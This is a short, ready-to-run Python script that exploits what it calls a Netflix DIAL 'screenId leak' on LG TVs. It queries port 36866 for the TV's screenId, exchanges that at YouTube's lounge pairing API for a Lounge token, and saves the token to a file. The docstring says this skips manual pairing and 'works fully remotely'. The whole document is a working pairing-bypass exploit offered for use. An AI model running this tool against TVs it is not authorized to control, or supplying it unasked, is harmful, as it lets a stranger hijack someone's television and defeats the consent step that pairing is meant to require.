#!/usr/bin/env python3
"""
Get YouTube Lounge token via Netflix DIAL screenId leak.
No manual pairing needed — works fully remotely.

Usage:
    python3 get_lounge_token.py --tv-ip 192.168.1.100
    python3 get_lounge_token.py --tv-ip 192.168.1.100 --output auth.json
"""
import argparse
import json
import re
import socket
import ssl
import sys
import time
import urllib.request


def get_screen_id(tv_ip: str, timeout: int = 10) -> str:
    """Extract screenId from Netflix DIAL response."""
    sock = socket.create_connection((tv_ip, 36866), timeout=timeout)
    sock.sendall(
        f"GET /apps/Netflix HTTP/1.1\r\nHost: {tv_ip}:36866\r\n\r\n".encode()
    )
    resp = b""
    while True:
        try:
            sock.settimeout(3)
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
            if b"</service>" in resp:
                break
        except socket.timeout:
            break
    sock.close()

    text = resp.decode("utf-8", errors="ignore")
    m = re.search(r"<screenId>([^<]+)</screenId>", text)
    if not m:
        raise RuntimeError(
            "screenId not found in DIAL response. "
            "Is Netflix installed on the TV?"
        )
    return m.group(1)


def get_lounge_token(screen_id: str) -> dict:
    """Exchange screenId for a YouTube Lounge token."""
    data = f"screen_ids={screen_id}".encode()
    req = urllib.request.Request(
        "https://www.youtube.com/api/lounge/pairing/get_lounge_token_batch",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp = json.loads(urllib.request.urlopen(req, timeout=10).read().decode())
    screen = resp["screens"][0]
    return {
        "screenId": screen["screenId"],
        "loungeToken": screen["loungeToken"],
        "expiration": screen["expiration"],
        "method": "netflix_dial_bypass",
        "obtained_at": int(time.time()),
    }


def main():
    parser = argparse.ArgumentParser(
        description="Get YouTube Lounge token via Netflix DIAL leak"
    )
    parser.add_argument("--tv-ip", required=True, help="LG TV IP address")
    parser.add_argument(
        "--output", "-o", default="ytlounge-auth.json", help="Output file"
    )
    args = parser.parse_args()

    print(f"[1] Getting screenId from {args.tv_ip}:36866 (Netflix DIAL)...")
    screen_id = get_screen_id(args.tv_ip)
    print(f"    screenId: {screen_id}")

    print("[2] Exchanging for Lounge token...")
    auth = get_lounge_token(screen_id)
    days = (auth["expiration"] / 1000 - time.time()) / 86400
    print(f"    token: {auth['loungeToken'][:30]}...")
    print(f"    expires in: {days:.1f} days")

    with open(args.output, "w") as f:
        json.dump(auth, f, indent=2)
    print(f"[OK] Saved to {args.output}")


if __name__ == "__main__":
    main()
